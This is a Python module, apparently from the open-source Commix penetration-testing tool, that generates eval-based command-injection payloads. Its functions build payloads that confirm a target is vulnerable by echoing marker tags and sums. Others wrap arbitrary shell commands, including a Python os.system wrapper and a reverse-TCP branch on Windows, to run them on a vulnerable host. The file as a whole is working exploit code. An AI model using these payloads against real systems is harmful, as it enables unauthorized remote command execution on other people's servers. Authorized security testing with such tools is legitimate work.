#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

from src.utils import settings
from src.core.controller import checks

"""
The dynamic code evaluation (aka eval-based) technique.
The available "eval-based" payloads.
"""

"""
Wrap the shell commands a payload runs in the print statement of the language being tested.
"""
def _print_statement(separator, commands, chain=None):
  return settings.EVAL_GRAMMAR.print_statement(separator, commands, chain)

"""
Read a value off a Windows command that prints no newline of its own, such as 'set /a'.
"""
def _windows_line(cmd):
  return "for /f \"tokens=* eol=\" %i in ('cmd /c \"" + cmd + "\"') do @echo %i"

"""
eval-based decision payload (check if host is vulnerable).
"""
def decision(separator, TAG, randv1, randv2):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    commands = ["echo " + TAG]
    if not settings.SKIP_CALC:
      commands.append(_windows_line("set /a (" + str(randv1) + "+" + str(randv2) + ")"))
    commands = commands + ["echo " + TAG, "echo " + TAG]
    payload = _print_statement(separator, commands, chain=checks.WINDOWS_CHAIN)

  else:
    commands = ["echo " + TAG]
    if not settings.SKIP_CALC:
      commands.append("echo $((" + str(randv1) + "+" + str(randv2) + "))")
    commands = commands + ["echo " + TAG, "echo " + TAG]
    payload = _print_statement(separator, commands)

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def decision_alter_interpreter(separator, TAG, randv1, randv2):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print(str(int(" + str(int(randv1)) + "+" + str(int(randv2)) + ")))\""
    commands = ["echo " + TAG]
    if not settings.SKIP_CALC:
      commands.append(python_payload)
    commands = commands + ["echo " + TAG, "echo " + TAG]
    payload = _print_statement(separator, commands, chain=checks.WINDOWS_CHAIN)

  else:
    python_payload = settings.LINUX_PYTHON_INTERPRETER + " -c \"print(str(int(" + str(int(randv1)) + "+" + str(int(randv2)) + ")))\""
    commands = ["echo " + TAG]
    if not settings.SKIP_CALC:
      # A leading space where nothing separates it from the marker before it.
      commands.append((settings.SINGLE_WHITESPACE if separator == "" else "") + python_payload)
    commands = commands + ["echo " + TAG, "echo " + TAG]
    payload = _print_statement(separator, commands)

  return payload

"""
Execute shell commands on vulnerable host.
"""
def cmd_execution(separator, TAG, cmd):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    # cmd.exe's echo prints quote characters literally, unlike a POSIX shell that strips them.
    commands = ["echo " + TAG, "echo " + TAG, cmd, "echo " + TAG, "echo " + TAG]
    payload = _print_statement(separator, commands, chain=checks.WINDOWS_CHAIN)
  else:
    settings.USER_APPLIED_CMD = cmd
    # Quoted where a separator chains it, so the marker cannot be read as part of the command.
    marker = "echo " + (TAG if separator == "" else "'" + TAG + "'")
    payload = _print_statement(separator, [marker, marker, cmd, marker, marker])

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def cmd_execution_alter_interpreter(separator, TAG, cmd):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if settings.REVERSE_TCP:
      payload = (separator + cmd + settings.SINGLE_WHITESPACE
                )
    else:
      python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"import os; os.system('" + cmd + "')\""
      commands = ["echo " + TAG, "echo " + TAG, python_payload, "echo " + TAG, "echo " + TAG]
      payload = _print_statement(separator, commands, chain=checks.WINDOWS_CHAIN)
  else:
    return cmd_execution(separator, TAG, cmd)
  return payload

# eof
